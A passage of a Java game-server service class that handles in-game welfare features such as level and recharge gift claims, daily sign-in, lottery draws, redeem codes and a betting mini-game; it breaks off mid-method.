
package com.kitty.system.game.welfare.service;

import com.kitty.cache.RedisService;
import com.kitty.common.bean.Lottery;
import com.kitty.common.db.DbRecordService;
import com.kitty.common.start.ServerService;
import com.kitty.common.thread.IdWorker;
import com.kitty.common.utils.*;
import com.kitty.common.utils.convert.MoneyUtil;
import com.kitty.common.utils.spring.SpringUtils;
import com.kitty.common.utils.uuid.IdUtils;
import com.kitty.listener.EventType;
import com.kitty.listener.annotation.EventHandler;
import com.kitty.listener.event.CreationRoleEvent;
import com.kitty.mina.ServerConfig;
import com.kitty.mina.cache.DataCache;
import com.kitty.mina.cache.Deploy;
import com.kitty.mina.cache.SessionUtils;
import com.kitty.mina.message.Message;
import com.kitty.mina.message.MessagePusher;
import com.kitty.record.RecordThread;
import com.kitty.system.common.data.DataGlobalFunc;
import com.kitty.system.common.message.RespHint;
import com.kitty.system.common.message.RespMsg;
import com.kitty.system.common.message.RespNotifyMiscEx;
import com.kitty.system.common.utils.NutConcurrentMap;
import com.kitty.system.game.bag.service.BagService;
import com.kitty.system.game.general.message.ReqGeneralNotify;
import com.kitty.system.game.role.domain.Role;
import com.kitty.system.game.role.service.RoleService;
import com.kitty.system.game.task.service.TaskService;
import com.kitty.system.game.vo.ItemEasyInfo;
import com.kitty.system.game.vo.Npc;
import com.kitty.system.game.vo.init.Item;
import com.kitty.system.game.vo.utils.Const;
import com.kitty.system.game.welfare.domain.FiveGuess;
import com.kitty.system.game.welfare.domain.GiftBag;
import com.kitty.system.game.welfare.domain.GiftBagRecord;
import com.kitty.system.game.welfare.domain.GiftsInfo;
import com.kitty.system.game.welfare.message.*;
import com.kitty.system.game.welfare.message.vo.LuckDrawInfo;
import com.kitty.system.game.welfare.message.vo.MagicBox;
import com.kitty.system.game.welfare.pool.WelfareDataPool;
import com.kitty.system.init.domain.*;
import com.kitty.system.init.domain.vo.Param;
import org.apache.mina.core.session.IoSession;
import org.nutz.dao.Cnd;
import org.nutz.dao.Dao;
import org.nutz.http.Request;
import org.nutz.http.Response;
import org.nutz.http.Sender;
import org.nutz.lang.Strings;
import org.nutz.lang.util.NutMap;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Service;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.math.BigDecimal;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.text.MessageFormat;
import java.util.*;
import java.util.stream.Collectors;

@Service
public class WelfareService
{
    @Autowired
    private Dao dao;
    @Autowired
    private IdWorker worker;
    @Autowired
    private ServerConfig serverConfig;
    @Autowired
    private BagService bagService;
    @Autowired
    private RoleService roleService;
    @Autowired
    private TaskService taskService;
    @Autowired
    private RedisService redisService;
    
    public void openNewBitGift(final Role role) {
        final Map<Integer, SysDataGradeAward> gradeAwardMap = WelfareDataPool.gradeAwardMap;
        final List<GiftsInfo> objects = new ArrayList<>();
        String newcomer = role.getExtendBox().getNewcomer();
        if (newcomer == null) {
            newcomer = "";
        }
        final String[] split = newcomer.split("-");
        final List<String> strings = Arrays.asList(split);
        for (final Integer grade : gradeAwardMap.keySet()) {
            if (strings.contains(String.valueOf(grade))) {
                objects.add(new GiftsInfo(grade.shortValue(), (byte)2));
            }
            else {
                objects.add(new GiftsInfo(grade.shortValue(), (byte)1));
            }
        }
        final RespNewBieGift respNewBieGift = new RespNewBieGift();
        respNewBieGift.setGifts(objects);
        MessagePusher.pushMessage(role, respNewBieGift);
    }
    
    public void fetchNewBieGift(final Role role, final int grade) {
        final boolean clicker = this.roleService.mouserClicker(role, "gift", 250L);
        if (clicker) {
            final String msg = DataGlobalFunc.needGradeJudge(grade / 1000, grade % 1000, role.getRelive(), role.getLevel(), "你的#<R>角色等级#不足");
            if (msg != null) {
                MessagePusher.pushMessage(role, new RespMsg(msg));
            }
            else {
                final Map<Integer, SysDataGradeAward> gradeAwardMap = WelfareDataPool.gradeAwardMap;
                String newcomer = role.getExtendBox().getNewcomer();
                if (newcomer == null) {
                    newcomer = "";
                }
                final String[] split = newcomer.split("-");
                final List<String> strings = Arrays.asList(split);
                if (strings.contains(String.valueOf(grade))) {
                    MessagePusher.pushMessage(role, new RespMsg("你已经领取过该阶段奖励"));
                }
                else {
                    final SysDataGradeAward award = gradeAwardMap.get(grade);
                    if (award != null) {
                        final boolean pos = this.bagService.checkPos(role, award.getAward());
                        if (!pos) {
                            return;
                        }
                        role.getExtendBox().setNewcomer(newcomer + "-" + grade);
                        MessagePusher.pushMessage(role, new RespHint(18, (short)1));
                        this.bagService.sendReward(role, award.getAward(), "等级奖励", 0);
                    }
                }
            }
        }
    }
    
    public void openRechargeGift(final Role role) {
        final Map<Integer, SysDataChargeAward> chargeMap = WelfareDataPool.chargeAwardMap;
        final long total_gold = role.getTotalGold();
        final ArrayList<Integer> totalContent = role.getExtendBox().getTotalContent();
        MessagePusher.pushMessage(role, new RespPayBieGift(this.giftsInfo(chargeMap, totalContent), String.valueOf(total_gold), (byte)0));
    }
    
    public void fetchRechargeGift(final Role role, final int serial) {
        final boolean clicker = this.roleService.mouserClicker(role, "gift", 250L);
        if (clicker) {
            final Map<Integer, SysDataChargeAward> chargeMap = WelfareDataPool.chargeAwardMap;
            final SysDataChargeAward charge = chargeMap.get(serial);
            if (charge == null) {
                MessagePusher.pushMessage(role, new RespMsg("您领取的奖励不存在"));
            }
            else {
                final ArrayList<Integer> totalContent = role.getExtendBox().getTotalContent();
                if (totalContent.contains(serial)) {
                    MessagePusher.pushMessage(role, new RespMsg("您已领取该阶段奖励"));
                }
                else {
                    final long total_gold = role.getTotalGold();
                    if (total_gold < charge.getAmount()) {
                        MessagePusher.pushMessage(role, new RespMsg("您没有资格领取"));
                    }
                    else {
                        final boolean pos = this.bagService.checkPos(role, charge.getAward());
                        if (pos) {
                            MessagePusher.pushMessage(role, new RespHint(19, (short)1));
                            totalContent.add(charge.getSerial());
                            this.bagService.sendReward(role, charge.getAward(), "某阶段充值", 0);
                            role.save();
                        }
                    }
                }
            }
        }
    }
    
    public void openFirstRechargeGift(final Role role) {
        final RespGiftState respGiftState = new RespGiftState();
        if (role.getExtendBox().getSc() == 1) {
            respGiftState.setState((byte)2);
        }
        else {
            final long total_gold = role.getTotalGold();
            if (total_gold > 0L) {
                respGiftState.setIs((byte)2);
            }
        }
        MessagePusher.pushMessage(role, respGiftState);
    }
    
    public void fetchFirstRechargeGift(final Role role) {
        final boolean clicker = this.roleService.mouserClicker(role, "gift", 250L);
        if (clicker) {
            final long total_gold = role.getTotalGold();
            if (total_gold <= 0L) {
                MessagePusher.pushMessage(role, new RespMsg("请先任意充值一笔，再来领取吧"));
            }
            else if (role.getExtendBox().getSc() == 1) {
                MessagePusher.pushMessage(role, new RespMsg("您已领取过奖励"));
            }
            else {
                final boolean pos = this.bagService.checkPos(role, WelfareDataPool.firstRechargeGift);
                if (pos) {
                    MessagePusher.pushMessage(role, new RespHint(20, (short)1));
                    role.getExtendBox().setSc((byte)1);
                    this.bagService.sendReward(role, WelfareDataPool.firstRechargeGift, "首冲礼包", 0);
                    role.save();
                    RecordThread.getInstance().add2Queue(role.getId(), role.getRoleId(), (short)1000, (byte)1, "领取首冲礼包", role.getMarking());
                }
            }
        }
    }
    
    public void openNewDistrictSign(final Role role, int day) {
        if (day <= 0) {
            final Date date = new Date(role.getCreateTime());
            day = TimeUtil.differentDays(date, new Date());
            ++day;
        }
        final NutMap map = role.getExtendBox().getNewDistrict();
        MessagePusher.pushMessage(role, new RespNewDistrictSign(JsonUtils.object2String(map), day));
    }
    
    public void fetchNewDistrictSign(final Role role) {
        final boolean clicker = this.roleService.mouserClicker(role, "gift", 250L);
        if (clicker) {
            final Date date = new Date(role.getCreateTime());
            int day = TimeUtil.differentDays(date, new Date());
            if (++day <= WelfareDataPool.newDistrictMap.size()) {
                final String key = String.valueOf(day);
                final NutMap newDistrict = role.getExtendBox().getNewDistrict();
                final int anInt = newDistrict.getInt(key);
                if (anInt > 0) {
                    MessagePusher.pushMessage(role, new RespMsg("你已经领取过该阶段奖励"));
                }
                else {
                    final SysDataNewDistrictSign sign = WelfareDataPool.newDistrictMap.get((byte)day);
                    if (sign != null) {
                        final boolean pos = this.bagService.checkPos(role, sign.getList());
                        if (pos) {
                            newDistrict.setv(key, (Object)1);
                            this.openNewDistrictSign(role, day);
                            this.bagService.sendReward(role, sign.getList(), "新区七天签到", 0);
                            role.save();
                            RecordThread.getInstance().add2Queue(role.getId(), role.getRoleId(), (short)1000, (byte)1, String.format("领取七天签到，天数为：%d", day), role.getMarking());
                        }
                    }
                }
            }
        }
    }
    
    public void openDayRechargeGift(final Role role) {
        final String when = TimeUtil.when();
        final Map<Integer, SysDataChargeAward> chargeMap = WelfareDataPool.dayChargeAwardMap;
        final long total_gold = role.getTaskProgress().getEveryDayRecharge().getLong(when + "_gold", 0L);
        final String string = role.getTaskProgress().getEveryDayRecharge().getString(when + "_award", "");
        final List<Integer> list = new ArrayList<Integer>();
        if (!string.isEmpty()) {
            for (final String s : string.split(",")) {
                list.add(Integer.valueOf(s));
            }
        }
        MessagePusher.pushMessage(role, new RespPayBieGift(this.giftsInfo(chargeMap, list), String.valueOf(total_gold), (byte)1));
    }
    
    public void fetchDayRechargeGift(final Role role, final int serial) {
        final Map<Integer, SysDataChargeAward> chargeMap = WelfareDataPool.dayChargeAwardMap;
        final SysDataChargeAward charge = chargeMap.get(serial);
        if (charge == null) {
            MessagePusher.pushMessage(role, new RespMsg("您领取的奖励不存在"));
        }
        else {
            final String when = TimeUtil.when();
            final NutConcurrentMap recharge = role.getTaskProgress().getEveryDayRecharge();
            final String string = recharge.getString(when + "_award", "");
            final List<Integer> list = new ArrayList<>();
            if (!string.isEmpty()) {
                for (final String s : string.split(",")) {
                    list.add(Integer.valueOf(s));
                }
            }
            if (list.contains(serial)) {
                MessagePusher.pushMessage(role, new RespMsg("您已领取该阶段奖励"));
            }
            else {
                final long total_gold = role.getTaskProgress().getEveryDayRecharge().getLong(when + "_gold", 0L);
                if (total_gold < charge.getAmount()) {
                    MessagePusher.pushMessage(role, new RespMsg("您没有资格领取"));
                }
                else {
                    final boolean pos = this.bagService.checkPos(role, charge.getAward());
                    if (pos) {
                        MessagePusher.pushMessage(role, new RespHint(19, (short)1));
                        recharge.setv(when + "_award", string + serial + ",");
                        this.bagService.sendReward(role, charge.getAward(), "每日充值", 0);
                        role.save();
                        RecordThread.getInstance().add2Queue(role.getId(), role.getRoleId(), (short)1000, (byte)1, String.format("领取某阶段每日充值礼包，礼包编号：%d", serial), role.getMarking());
                    }
                }
            }
        }
    }
    
    public List<GiftsInfo> giftsInfo(final Map<Integer, SysDataChargeAward> chargeMap, final List<Integer> list) {
        final List<GiftsInfo> objects = new ArrayList<GiftsInfo>();
        for (final Integer key : chargeMap.keySet()) {
            final SysDataChargeAward charge = chargeMap.get(key);
            if (list.contains(key)) {
                objects.add(new GiftsInfo((short)charge.getSerial(), (byte)2));
            }
            else {
                objects.add(new GiftsInfo((short)charge.getSerial(), (byte)1));
            }
        }
        return objects;
    }
    
    public void openPrizeDraw(final Role role) {
        final int count = role.getExtendBox().getParams().getInt("prize_draw", 0);
        final RespPrizeDraw respPrizeDraw = new RespPrizeDraw();
        respPrizeDraw.setCount((short)count);
        MessagePusher.pushMessage(role, respPrizeDraw);
    }
    
    public void luckDraw(final IoSession session, final ReqLuckDraw reqLuckDraw) {
        final Role role = SessionUtils.getRoleBySession(session);
        if (role != null) {
            final boolean clicker = this.roleService.mouserClicker(role, "luck", 250L);
            if (clicker) {
                int num = 10;
                long deductScore = WelfareDataPool.TEN_LUCK_DRAW;
                if (reqLuckDraw.getType() == 1) {
                    num = 1;
                    deductScore = WelfareDataPool.ONCE_LUCK_DRAW;
                }
                if (role.getExtendBox().getChargeScore() < deductScore) {
                    MessagePusher.pushMessage(role, new RespMsg("积分不足"));
                }
                else if (this.bagService.residueBagPos(role, false) < num) {
                    MessagePusher.pushMessage(role, new RespMsg("物品栏空间不足"));
                }
                else {
                    final RoleService roleService = SpringUtils.getRoleService();
                    final boolean b = roleService.deductCurrency(role, Const.RES_TYPE_CHARGE_SCORE, deductScore, "请求抽奖");
                    if (b) {
                        final List<SysDataLuckDraw> randoms = WelfareDataPool.luckDraw;
                        final List<Lottery> list = new ArrayList<Lottery>();
                        randoms.forEach(itemOpen -> list.add(new Lottery(itemOpen.getId(), "", itemOpen.getRate())));
                        final List<Double> orignalRates = new ArrayList<Double>(list.size());
                        for (final Lottery lottery : list) {
                            orignalRates.add(lottery.getBili());
                        }
                        final List<SysDataLuckDraw> objects = new ArrayList<>(num);
                        final List<LuckDrawInfo> drawInfo = new ArrayList<>(num);
                        for (int i = 0; i < num; ++i) {
                            final int serial = LotteryUtils.lottery(orignalRates);
                            final Lottery lottery2 = list.get(serial);
                            final SysDataLuckDraw luckDraw = randoms.stream().filter(e -> lottery2.getSerial().equals(e.getId())).findFirst().orElse(null);
                            if (luckDraw != null) {
                                objects.add(luckDraw);
                                drawInfo.add(new LuckDrawInfo(luckDraw.getSerial(), luckDraw.getNum()));
                            }
                            else {
                                System.out.println("幸运抽抽数据为空 = " + luckDraw);
                            }
                        }
                        final RespLuckDrawInfo respLuckDrawInfo = new RespLuckDrawInfo();
                        respLuckDrawInfo.setList(drawInfo);
                        respLuckDrawInfo.setClassify(reqLuckDraw.getClassify());
                        MessagePusher.pushMessage(role, respLuckDrawInfo);
                        int serial = 0;
                        int addNum = 0;
                        for (final SysDataLuckDraw object : objects) {
                            if (object.getIsNotice() >= 1) {
                                addNum = object.getNum();
                                serial = object.getSerial();
                            }
                            this.bagService.send(role, object.getSerial(), object.getType(), object.getNum(), -1, "幸运抽抽", 0);
                        }
                        role.save();
                        if (serial > 0) {
                            final ItemEasyInfo easyInfo = DataGlobalFunc.getItemEasyInfo(serial);
                            if (easyInfo == null) {
                                return;
                            }
                            String tips = "";
                            if (addNum > 1) {
                                tips = "#<r:239,g:105,b:33>X" + addNum + "#";
                            }
                            MessagePusher.notify2Lb(role, 205, role.getName(), serial, easyInfo.getName(), tips);
                        }
                    }
                }
            }
        }
    }
    
    public void prizeDraw(final IoSession session, final ReqLuckDraw reqLuckDraw) {
        final Role role = SessionUtils.getRoleBySession(session);
        if (role != null) {
            final boolean clicker = this.roleService.mouserClicker(role, "luck", 250L);
            if (clicker) {
                int count = role.getExtendBox().getParams().getInt("prize_draw", 0);
                int num = 5;
                long deductGold = WelfareDataPool.FIVE_PRIZE_DRAW;
                if (reqLuckDraw.getType() == 1) {
                    num = 1;
                    deductGold = WelfareDataPool.ONCE_PRIZE_DRAW;
                }
                if (this.roleService.checkCurrency(role, Const.RESTYPE_GOLD, deductGold)) {
                    if (this.bagService.residueBagPos(role, false) < num) {
                        MessagePusher.pushMessage(role, new RespMsg("物品栏空间不足"));
                    }
                    else {
                        final RoleService roleService = SpringUtils.getRoleService();
                        final boolean b = roleService.deductCurrency(role, Const.RESTYPE_GOLD, deductGold, "镜鉴绮罗");
                        if (b) {
                            final List<SysDataPrizeDraw> randoms = WelfareDataPool.prizeDrawMap;
                            final List<Lottery> list = new ArrayList<>();
                            randoms.forEach(itemOpen -> list.add(new Lottery(itemOpen.getId(), "", itemOpen.getRate())));
                            final List<Double> rates = new ArrayList<>(list.size());
                            final Iterator<Lottery> iterator = list.iterator();
                            Lottery lottery = null;
                            while (iterator.hasNext()) {
                                lottery = iterator.next();
                                rates.add(lottery.getBili());
                            }
                            final List<SysDataPrizeDraw> objects = new ArrayList<>(num);
                            final List<LuckDrawInfo> drawInfo = new ArrayList<>(num);
                            for (int i = 0; i < num; ++i) {
                                if (++count >= WelfareDataPool.prizeDrawTop) {
                                    objects.add(new SysDataPrizeDraw(-1, 1, 1));
                                    drawInfo.add(new LuckDrawInfo(-1, 1));
                                    count = 0;
                                }
                                else {
                                    final int index = LotteryUtils.lottery(rates);
                                    final Lottery lottery2 = list.get(index);
                                    final SysDataPrizeDraw luckDraw = randoms.stream().filter(e -> lottery2.getSerial().equals(e.getId())).findFirst().orElse(null);
                                    if (luckDraw != null) {
                                        objects.add(luckDraw);
                                        drawInfo.add(new LuckDrawInfo(luckDraw.getSerial(), luckDraw.getNum()));
                                    }
                                    else {
                                        System.out.println("累计数据为空 = " + luckDraw);
                                    }
                                }
                            }
                            final RespLuckDrawInfo respLuckDrawInfo = new RespLuckDrawInfo();
                            respLuckDrawInfo.setList(drawInfo);
                            respLuckDrawInfo.setClassify(reqLuckDraw.getClassify());
                            MessagePusher.pushMessage(role, respLuckDrawInfo);
                            for (final SysDataPrizeDraw object : objects) {
                                this.bagService.send(role, object.getSerial(), object.getType(), object.getNum(), -1, "镜鉴绮罗", 0);
                            }
                            role.getExtendBox().getParams().setv("prize_draw", count);
                            this.openPrizeDraw(role);
                            role.save();
                        }
                    }
                }
            }
        }
    }
    
    public void fetchGiftBag(final Role role, final String string) {
        final boolean clicker = this.roleService.mouserClicker(role, "gift", 250L);
        if (clicker) {
            final long millis = System.currentTimeMillis();
            final GiftBag giftBag = WelfareDataPool.giftBagMap.get(string);
            if (giftBag == null) {
                MessagePusher.pushMessage(role, new RespMsg("激活失败，此码错误!"));
            }
            else if (giftBag.getTime() > 0L && millis > giftBag.getTime()) {
                MessagePusher.pushMessage(role, new RespMsg("激活失败，此码已过期!"));
            }
            else {
                final List<String> giftBagRecordList = this.getGiftBagRecord(role);
                if (giftBagRecordList.contains(string)) {
                    MessagePusher.pushMessage(role, new RespMsg("激活失败，此码错误或已过期#<E:17>#"));
                }
                else {
                    final boolean pos = this.bagService.checkPos(role, giftBag.getRewards());
                    if (pos) {
                        giftBagRecordList.add(string);
                        final GiftBagRecord record = new GiftBagRecord(role.getId(), string);
                        DbRecordService.getInstance().add2Queue(record);
                        final String cause = String.format("领取兑换码：%s", string);
                        this.bagService.sendReward(role, giftBag.getRewards(), cause, 0);
                        RecordThread.getInstance().add2Queue(role.getId(), role.getRoleId(), (short)1000, (byte)1, cause, role.getMarking());
                    }
                }
            }
        }
    }
    
    public void recharge(final Role role, final ReqGeneralNotify notify) {
        if (SpringUtils.getBean(ServerService.class).getRecharge() > 0) {
            try {
                final SysCharge sysCharge = WelfareDataPool.chargeMap.get(Integer.valueOf(notify.getStatus()));
                if (sysCharge == null) {
                    MessagePusher.pushMessage(role, new RespMsg("充值异常-请正确充值"));
                }
                final ServerService service = SpringUtils.getBean(ServerService.class);
                final Map<String, Object> params = new HashMap<>(7);
                params.put("id", role.getSid());
                params.put("roleId", role.getRoleId());
                params.put("serial", notify.getStatus());
                params.put("type", notify.getString());
                params.put("totalAmount", String.valueOf(sysCharge.getAmount()));
                params.put("simulate", "1");
                params.put("server", role.getMarking());
                final Request request = Request.create(service.getUrl(), Request.METHOD.POST).setParams(params);
                final Response response = Sender.create(request).setTimeout(30000).send();
                if (response.isOK()) {
                    if (!Strings.isEmpty(response.getContent())) {
                        final String content = response.getContent();
                        final int length = content.length();
                        final String front = content.substring(0, length / 2);
                        final String back = content.substring(length / 2);
                        MessagePusher.pushMessage(role, new RespPayUrl(front, back));
                    }
                    else {
                        MessagePusher.pushMessage(role, new RespMsg("充值异常"));
                    }
                }
                else {
                    MessagePusher.pushMessage(role, new RespMsg("充值异常-未找到地址"));
                }
            }
            catch (final Exception var12) {
                MessagePusher.pushMessage(role, new RespMsg("充值未开启"));
            }
        }
    }
    
    public List<String> getGiftBagRecord(final Role role) {
        List<String> strings = DataCache.GIFT_RECORD.get(role.getId());
        if (strings != null) {
            return strings;
        }
        strings = new ArrayList<String>();
        final List<GiftBagRecord> list = this.dao.query(GiftBagRecord.class, Cnd.where("r_id", "=", role.getId()));
        for (final GiftBagRecord record : list) {
            strings.add(record.getName());
        }
        DataCache.GIFT_RECORD.put(role.getId(), strings);
        return strings;
    }
    
    public void fiveGuess(final IoSession session, final ReqFiveGuess reqFiveGuess) {
        final Role role = SessionUtils.getRoleBySession(session);
        if (role != null) {
            if (reqFiveGuess.getAmount() <= 0) {
                MessagePusher.pushMessage(role.getId(), new RespMsg("请先竞猜金额。"));
            }
            else {
                final long limitAmount = 30000000L;
                if (reqFiveGuess.getAmount() > limitAmount) {
                    MessagePusher.pushMessage(role.getId(), new RespMsg(String.format("竞猜金额上限：#<R>%s#", MoneyUtil.partition(new BigDecimal(limitAmount)))));
                }
                else if (this.guessLimit(role)) {
                    final FiveGuess guessInfo = this.getFiveGuessInfo(role);
                    if (guessInfo.getToken() != null) {
                        MessagePusher.pushMessage(role.getId(), new RespMsg("转盘转动中，请稍后再试。"));
                    }
                    else if (guessInfo.getCount() <= 0) {
                        MessagePusher.pushMessage(role.getId(), new RespMsg("你今天的机会已经用完了，还是明天再来吧!"));
                    }
                    else {
                        final boolean currency = this.roleService.deductCurrency(role, Const.RESTYPE_SILVER, reqFiveGuess.getAmount(), "五行竞猜");
                        if (currency) {
                            final short type = reqFiveGuess.getChoice();
                            final String str = type + "";
                            String outer;
                            String inner;
                            if (str.length() == 2) {
                                outer = str.substring(0, 1);
                                inner = str.substring(1, str.length());
                            }
                            else {
                                if (str.length() != 3) {
                                    return;
                                }
                                outer = str.substring(0, 2);
                                inner = str.substring(2, str.length());
                            }
                            String prizeOuter;
                            if (RandomUtil.round(1, WelfareDataPool.FIVE_GUESS_OUTER_PROB) == 1) {
                                prizeOuter = outer;
                            }
                            else {
                                int r;
                                do {
                                    r = RandomUtil.round(1, 12);
                                } while (r == Integer.parseInt(outer));
                                prizeOuter = r + "";
                            }
                            String prizeInner;
                            if (RandomUtil.round(1, WelfareDataPool.FIVE_GUESS_INNER_PROB) == 1) {
                                prizeInner = inner;
                            }
                            else {
                                int r2;
                                do {
                                    r2 = RandomUtil.round(1, 5);
                                } while (r2 == Integer.parseInt(inner));
                                prizeInner = r2 + "";
                            }
                            final short count = (short)(guessInfo.getCount() - 1);
                            short count2;
                            if (count < 0) {
                                count2 = 0;
                            }
                            else {
                                count2 = count;
                            }
                            guessInfo.setCount(count2);
                            guessInfo.setToken(IdUtils.fastSimpleUUID());
                            guessInfo.setAmount(reqFiveGuess.getAmount());
                            guessInfo.setChoice(reqFiveGuess.getChoice());
                            guessInfo.setPrize(Short.valueOf(prizeOuter + prizeInner));
                            guessInfo.save();
                            final RespFiveGuess respFiveGuess = new RespFiveGuess((byte)1, String.valueOf(guessInfo.getMoney()), "0", reqFiveGuess.getAmount(), type, guessInfo.getPrize(), guessInfo.getToken(), guessInfo.getCount());
                            MessagePusher.pushMessage(session, respFiveGuess);
                        }
                    }
                }
            }
        }
    }
    
    public void fiveGuessReply(final IoSession session, final ReqFiveGuessReply reqFiveGuessReply) {
        final Role role = SessionUtils.getRoleBySession(session);
        if (role != null) {
            final FiveGuess guessInfo = this.getFiveGuessInfo(role);
            if (guessInfo.getToken().equals(reqFiveGuessReply.getToken())) {
                String msg = "";
                long multi = 1L;
                if (guessInfo.getChoice() == guessInfo.getPrize()) {
                    multi = 60L;
                    final String[] choice = DataGlobalFunc.getGuess(guessInfo.getPrize() + "");
                    final String outerName = WelfareDataPool.FIVE_GUESS_OUTER_NAME[Integer.parseInt(choice[0]) - 1];
                    final String outerName2 = WelfareDataPool.FIVE_GUESS_INNER_NAME[Integer.parseInt(choice[1]) - 1];
                    msg = MessageFormat.format("真是好运气啊！#<BB>{0}#在五行竞猜活动中猜中了五行#<EP>{1}#神兽#<EP>{2}#，获得了#<IR{3}>#{4}#<EP>银两#的奖励！", role.getName(), outerName2, outerName, Const.RESTYPE_SILVER, MoneyUtil.colours(multi * guessInfo.getAmount()));
                }
                else {
                    final String[] choice = DataGlobalFunc.getGuess(guessInfo.getChoice() + "");
                    final String[] prize2 = DataGlobalFunc.getGuess(guessInfo.getPrize() + "");
                    if (choice == null || prize2 == null) {
                        guessInfo.clear();
                        guessInfo.save();
                        return;
                    }
                    if (choice[1].equals(prize2[1])) {
                        multi *= 5L;
                        final String outerName2 = WelfareDataPool.FIVE_GUESS_INNER_NAME[Integer.parseInt(prize2[1]) - 1];
                        msg = MessageFormat.format("真是好运气啊！#<BB>{0}#在五行竞猜活动中猜中了五行#<EP>{1}#，获得了#<IR{2}>#{3}#<EP>银两#的奖励！", role.getName(), outerName2, Const.RESTYPE_SILVER, MoneyUtil.colours(multi * guessInfo.getAmount()));
                    }
                    else if (choice[0].equals(prize2[0])) {
                        multi *= 12L;
                        final String outerName2 = WelfareDataPool.FIVE_GUESS_OUTER_NAME[Integer.parseInt(prize2[0]) - 1];
                        msg = MessageFormat.format("真是好运气啊！#<BB>{0}#在五行竞猜活动中猜中了神兽#<EP>{1}#，获得了#<IR{2}>#{3}#<EP>银两#的奖励！", role.getName(), outerName2, Const.RESTYPE_SILVER, MoneyUtil.colours(multi * guessInfo.getAmount()));
                    }
                }
                if (multi > 1L) {
                    final long giftMoney = multi * guessInfo.getAmount();
                    guessInfo.setMoney(guessInfo.getMoney() + giftMoney);
                    MessagePusher.pushMessage(role.getId(), new RespFiveGuess((byte)0, String.valueOf(guessInfo.getMoney()), String.valueOf(giftMoney), guessInfo.getAmount(), guessInfo.getChoice(), guessInfo.getPrize(), null, guessInfo.getCount()));
                    SpringUtils.getBroadcastThread().add2Queue(msg);
                }
                guessInfo.clear();
                guessInfo.save();
            }
        }
    }
    
    public void drawMoneyFiveGuess(final IoSession session) {
        final Role role = SessionUtils.getRoleBySession(session);
        if (role != null) {
            final boolean clicker = this.roleService.mouserClicker(role, "gift", 250L);
            if (clicker) {
                final FiveGuess guessInfo = this.getFiveGuessInfo(role);
                final long money = guessInfo.getMoney();
                if (money > 0L) {
                    guessInfo.setMoney(0L);
                    this.roleService.addCurrency(role, Const.RESTYPE_SILVER, money, "五行竞猜提款", true, false);
                    guessInfo.save();
                    MessagePusher.pushMessage(role.getId(), new RespFiveGuess(guessInfo.getCount()));
                }
            }
        }
    }
    
    public FiveGuess getFiveGuessInfo(final Role role) {
        FiveGuess fiveGuess = DataCache.FIVE_GUESS_MAP.get(role.getId());
        if (fiveGuess == null) {
            fiveGuess = this.dao.fetch(FiveGuess.class, Cnd.where("r_id", "=", role.getId()));
            if (fiveGuess == null) {
                fiveGuess = new FiveGuess(this.worker.nextId(), role.getId());
                fiveGuess.save();
            }
            DataCache.FIVE_GUESS_MAP.put(role.getId(), fiveGuess);
            return fiveGuess;
        }
        return fiveGuess;
    }
    
    public void dailyResetFiveGuess(final Role role) {
        FiveGuess fiveGuess = DataCache.FIVE_GUESS_MAP.get(role.getId());
        if (fiveGuess == null) {
            fiveGuess = (FiveGuess)this.dao.fetch(FiveGuess.class, Cnd.where("r_id", "=", role.getId()));
            if (fiveGuess == null) {
                return;
            }
            DataCache.FIVE_GUESS_MAP.put(role.getId(), fiveGuess);
        }
        if (fiveGuess.getCount() < WelfareDataPool.FIVE_GUESS_COUNT) {
            fiveGuess.setCount(WelfareDataPool.FIVE_GUESS_COUNT);
            fiveGuess.save();
        }
    }
    
    public void npcButton(final Role role, final String msg, final Npc npc) {
        if ("five_guess".equals(msg)) {
            final RespFiveGuess respFiveGuess = new RespFiveGuess();
            final FiveGuess guessInfo = this.getFiveGuessInfo(role);
            if (guessInfo.getToken() != null) {
                respFiveGuess.setFlag((byte)1);
                MessagePusher.pushMessage(role.getId(), new RespMsg("上次竞猜被异常中断，重新继续上次竞猜。"));
            }
            respFiveGuess.setToken(guessInfo.getToken());
            respFiveGuess.setMoney(String.valueOf(guessInfo.getMoney()));
            respFiveGuess.setAmount(guessInfo.getAmount());
            respFiveGuess.setChoice(guessInfo.getChoice());
            respFiveGuess.setPrize(guessInfo.getPrize());
            respFiveGuess.setCount(guessInfo.getCount());
            MessagePusher.pushMessage(role.getId(), respFiveGuess);
        }
    }
    
    public boolean guessLimit(final Role role) {
        if (SpringUtils.getBean(ServerService.class).getType() == 1) {
            final String msg = DataGlobalFunc.needGradeJudge(Deploy.five_guess_need_relive, Deploy.five_guess_need_level, role.getRelive(), role.getLevel(), "你的#<R>角色等级#不足");
            if (msg != null) {
                MessagePusher.pushMessage(role, new RespMsg(msg));
                return false;
            }
            final Message message = DataGlobalFunc.operationalConstraint(role, Deploy.five_guess, "充值#<R>%d#才可以操作五行竞猜！");
            if (message != null) {
                MessagePusher.pushMessage(role, message);
                return false;
            }
            if (Deploy.mobile > 0 && (role.getMobile() == null || role.getMobile().length() < 11)) {
                MessagePusher.pushMessage(role, new RespMsg("请先绑定手机再进行操作！"));
                return false;
            }
        }
        return true;
    }
    
    public void reqMagicBoxInfo(final Role role, final ReqMagicBoxInfo reqMagicBoxInfo) {
        final RespMagicBoxInfo magicBoxInfo = this.getMagicBoxInfo(role, reqMagicBoxInfo.getAffiliation(), true);
        if (magicBoxInfo != null) {
            MessagePusher.pushMessage(role, magicBoxInfo);
        }
    }
    
    public RespMagicBoxInfo getMagicBoxInfo(final Role role, final int affiliation, final boolean flag) {
        final List<SysDataMagicBox> list = WelfareDataPool.magicBoxMap.get(affiliation);
        if (list == null) {
            return null;
        }
        final RespMagicBoxInfo respMagicBoxInfo = new RespMagicBoxInfo();
        respMagicBoxInfo.setAffiliation(affiliation);
        final List<SysDataMagicBox> collect = list.stream().filter(e -> {
            final boolean b = e.getClassify() == 1;
            return b;
        }).collect(Collectors.toList());
        for (final SysDataMagicBox magic : collect) {
            respMagicBoxInfo.getLeft().add(new MagicBox(magic.getSerial(), magic.getNum(), magic.getBd()));
        }
        String string = null;
        if (flag) {
            string = this.redisService.get(role.getId() + "magic_box" + affiliation, String.class);
        }
        if (string != null) {
            for (final String id : string.split("、")) {
                final SysDataMagicBox box2 = list.stream().filter(e -> Integer.valueOf(id).equals(e.getIdentify())).findFirst().orElse(null);
                if (box2 != null) {
